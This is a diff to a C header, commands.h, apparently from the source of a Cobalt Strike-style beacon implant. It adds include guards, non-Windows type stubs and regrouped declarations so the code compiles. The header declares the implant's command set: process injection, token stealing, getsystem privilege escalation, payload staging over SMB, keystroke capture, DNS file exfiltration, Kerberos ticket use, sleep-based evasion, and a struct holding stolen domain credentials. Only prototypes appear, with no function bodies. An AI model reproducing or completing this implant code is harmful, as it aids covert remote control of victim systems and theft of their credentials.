@@ -1,3 +1,60 @@
+#ifndef COMMANDS_H
+#define COMMANDS_H
+
+#ifdef _WIN32
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#include <processthreadsapi.h>
+#include <tlhelp32.h>
+#include <winbase.h>
+#include <processenv.h>
+#else
+// 为非Windows环境定义Windows类型
+typedef unsigned long DWORD;
+typedef int BOOL;
+typedef void* HANDLE;
+typedef struct {
+    DWORD cb;
+    char* lpReserved;
+    char* lpDesktop;
+    char* lpTitle;
+    DWORD dwX;
+    DWORD dwY;
+    DWORD dwXSize;
+    DWORD dwYSize;
+    DWORD dwXCountChars;
+    DWORD dwYCountChars;
+    DWORD dwFillAttribute;
+    DWORD dwFlags;
+    unsigned short wShowWindow;
+    unsigned short cbReserved2;
+    unsigned char* lpReserved2;
+    HANDLE hStdInput;
+    HANDLE hStdOutput;
+    HANDLE hStdError;
+} STARTUPINFO;
+
+typedef struct {
+    HANDLE hProcess;
+    HANDLE hThread;
+    DWORD dwProcessId;
+    DWORD dwThreadId;
+} PROCESS_INFORMATION;
+#endif
+
+#include <stdlib.h>
+#include <stdio.h>
+#include "beacon.h"
+#include "parse.h"
+#include "inject.h"
+#include "tokens.h"
+#include "process.h"
+#include <tomcrypt.h>
+#include "jobs.h"
+#include "functions.h"
+
 #define CALLBACK_OUTPUT       0x00
 #define CALLBACK_KEYSTROKES   0x01
 #define CALLBACK_FILE         0x02
@@ -48,6 +105,7 @@
 /* for file downloads over DNS */
 #define MAX_PACKET_DNS 4096
 
+// 函数声明 - 现有实现的函数
 void command_blockdlls(char * buffer, int length);
 void command_die(void(*cb)(char * buffer, int length, int type));
 void command_sleep(char * buffer, int length);
@@ -56,25 +114,35 @@ void command_inject_ping(char * buffer, int length, BOOL x86, void (*cb)(char * 
 void command_inject_pid(char * buffer, int length, BOOL x86);
 void command_spawnas(char * buffer, int length, BOOL x86);
 void command_spawnu(char * buffer, int length, BOOL x86);
-void command_dll_load(char * buffer, int length);
 void command_cd(char * buffer, int length);
 void command_execjob(char * buffer, int length);
 void command_upload(char * buffer, int length, char * mode);
 void command_execute(char * buffer, int length);
 void command_spawnproc(char * buffer, int length, BOOL x86);
-void command_runas(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 void command_runu(char * buffer, int length);
 void command_pwd(void(*callback)(char * buffer, int length, int type));
-void command_pause(char * buffer, int length);
 void command_ipconfig(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_loginuser(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
-void command_stage_payload(char * buffer, int length);
-void command_stage_payload_smb(char * buffer, int length);
 void command_setenv(char * buffer, int length);
 void command_ppid(char * buffer, int length);
 void command_inject_pid_ping(char * buffer, int length, void(*callback)(char * buffer, int length, int type), BOOL x86);
 void command_reg_query(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
+
+// 添加缺失函数的实现声明
+void command_dll_load(char * buffer, int length);
 void command_elevate_run_inject(BOOL x86, char * buffer, int length);
+void command_download(char * buffer, int length, void (*cb)(char * buffer, int length, int type));
+void command_getsystem(char * buffer, int length);
+void token_report(void (*cb)(char * buffer, int length, int type));
+void command_link_start(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
+void command_runas(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
+void command_pause(char * buffer, int length);
+void command_stage_payload(char * buffer, int length);
+void command_stage_payload_smb(char * buffer, int length);
+void command_file_delete(char * buffer, int length);
+void command_kerberos_ticket_use(char * buffer, int length);
+void command_psh_host_tcp(char * buffer, int length);
+void command_webserver_local(char * buffer, int length);
 
 /* job API */
 void command_job_register(char * buffer, int length, BOOL impersonate, short mode);
@@ -97,7 +165,6 @@ BOOL spawn_patsy_u(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMA
 void spawn_populate(BOOL x86, char * cmdbuff);
 
 /* download related commands */
-void command_download(char * buffer, int length, void (*cb)(char * buffer, int length, int type));
 void command_download_stop(char * buffer, int length);
 
 /* token related commands */
@@ -106,7 +173,6 @@ void command_rev2self();
 void command_steal_token(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 
 /* privilege escalation commands */
-void command_getsystem(char * buffer, int length);
 void command_elevate_pre(char * buffer, int length);
 void command_elevate_post(void(*callback)(char * buffer, int length, int type));
 void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
@@ -122,12 +188,10 @@ void command_socket_tcppivot(char * buffer, int length);
 
 void pivot_poll(void (*cb)(char * buffer, int length, int type));
 void download_poll(void (*cb)(char * buffer, int length, int type), int max);
-void token_report(void (*cb)(char * buffer, int length, int type));
 void psh_poll(void (*callback)(char * buffer, int length, int type), int max);
 
 /* linking and message routing stuff */
 void command_link_wait();
-void command_link_start(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_link_start_explicit(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_link_stop(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_link_route(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
@@ -142,7 +206,6 @@ void command_ps_kill(char * buffer, int length);
 void command_file_list(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_file_mkdir(char * buffer, int length);
 void command_file_drives(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
-void command_file_delete(char * buffer, int length);
 void command_file_copy(char * buffer, int length);
 void command_file_move(char * buffer, int length);
 
@@ -153,12 +216,9 @@ void command_argue_list(void(*callback)(char * buffer, int length, int type));
 
 /* kerberos related commands */
 void command_kerberos_ticket_purge();
-void command_kerberos_ticket_use(char * buffer, int length);
 
 /* powershell related commands */
 void command_psh_import(char * buffer, int length);
-void command_psh_host_tcp(char * buffer, int length);
-void command_webserver_local(char * buffer, int length);
 
 /* inline execute mechanism... *pHEAR* */
 void command_inline_execute(char * buffer, int length);
@@ -203,9 +263,11 @@ void GargleSleep(DWORD time);
 
 /* alternate credentials data structure */
 typedef struct {
-	wchar_t * domain;
-	wchar_t * user;
-	wchar_t * password;
-	void    * manager;
-	BOOL      active;
+    wchar_t * domain;
+    wchar_t * user;
+    wchar_t * password;
+    void    * manager;
+    BOOL      active;
 } ALTCREDS;
+
+#endif // COMMANDS_H
